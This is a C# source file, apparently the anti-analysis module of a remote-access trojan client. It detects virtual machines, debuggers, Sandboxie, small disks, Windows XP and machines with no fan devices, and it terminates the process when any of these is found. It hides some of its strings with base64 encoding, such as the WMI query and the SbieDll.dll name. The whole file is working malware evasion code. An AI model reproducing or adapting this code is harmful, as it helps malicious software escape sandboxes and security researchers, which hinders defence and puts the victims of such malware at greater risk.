using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;

namespace Client.Helper
{

    class Anti_Analysis
    {
        public static void RunAntiAnalysis()
        {
            if (isVM_by_wim_temper()) 
            {
                Environment.FailFast(null);
            }
            Thread.Sleep(1000);
            //if (DetectManufacturer() || DetectDebugger() || DetectSandboxie() || IsSmallDisk() || IsXP()|| isVM())
            if (DetectManufacturer() || DetectDebugger() || DetectSandboxie() || IsSmallDisk() || IsXP())
                Environment.FailFast(null);

        }

        private static bool IsSmallDisk()
        {
            try
            {
                long GB_60 = 61000000000;
                if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= GB_60)
                    return true;
            }
            catch { }
            return false;
        }

        private static bool IsXP()
        {
            try
            {
                if (new Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.ToLower().Contains("xp"))
                {
                    return true;
                }
            }
            catch { }
            return false;
        }

        private static bool DetectManufacturer()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(System.Text.Encoding.Default.GetString(Convert.FromBase64String("U2VsZWN0ICogZnJvbSBXaW4zMl9Db21wdXRlclN5c3RlbQ=="))))//Select * from Win32_ComputerSystem
                {
                    using (var items = searcher.Get())
                    {
                        foreach (var item in items)
                        {
                            string manufacturer = item["Manufacturer"].ToString().ToLower();
                            if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                                || manufacturer.Contains("vmware"))//"VirtualBox"
                            {
                                return true;
                            }
                        }
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool DetectDebugger()
        {
            bool isDebuggerPresent = false;
            try
            {
                NativeMethods.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                return isDebuggerPresent;
            }
            catch
            {
                return isDebuggerPresent;
            }
        }

        private static bool DetectSandboxie()
        {
            try
            {
                if (NativeMethods.GetModuleHandle(System.Text.Encoding.Default.GetString(Convert.FromBase64String("U2JpZURsbC5kbGw="))).ToInt32() != 0)//SbieDll.dll
                    return true;
                else
                    return false;
            }
            catch
            {
                return false;
            }
        }
        /*
         * public static bool isVM()
        {
            bool foundMatch = false;
            ManagementObjectSearcher search1 = new ManagementObjectSearcher("select * from Win32_BIOS");
            var enu = search1.Get().GetEnumerator();
            if (!enu.MoveNext()) throw new Exception("Unexpected WMI query failure");
            string biosVersion = enu.Current["version"].ToString();
            string biosSerialNumber = enu.Current["SerialNumber"].ToString();

            try
            {
                foundMatch = Regex.IsMatch(biosVersion + " " + biosSerialNumber, "VMware|VIRTUAL|A M I|Xen", RegexOptions.IgnoreCase);
            }
            catch (ArgumentException)
            {
                // Syntax error in the regular expression
            }

            ManagementObjectSearcher search2 = new ManagementObjectSearcher("select * from Win32_ComputerSystem");
            var enu2 = search2.Get().GetEnumerator();
            if (!enu2.MoveNext()) throw new Exception("Unexpected WMI query failure");
            string manufacturer = enu2.Current["manufacturer"].ToString();
            string model = enu2.Current["model"].ToString();
            try
            {
                foundMatch = Regex.IsMatch(manufacturer + " " + model, "Microsoft|VMWare|Virtual", RegexOptions.IgnoreCase);
            }
            catch (ArgumentException)
            {
                // Syntax error in the regular expression
            }

            return foundMatch;
        }
        */
        public static bool isVM_by_wim_temper()
        {            
            SelectQuery selectQuery = new SelectQuery("Select * from Win32_Fan");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);
            int i = 0;
            foreach (ManagementObject DeviceID in searcher.Get())
            {
                i++;
            }
            if (i == 0)
            {
                return true;
            }
            else 
            {
                return false;
            }
            
        }

    }
}
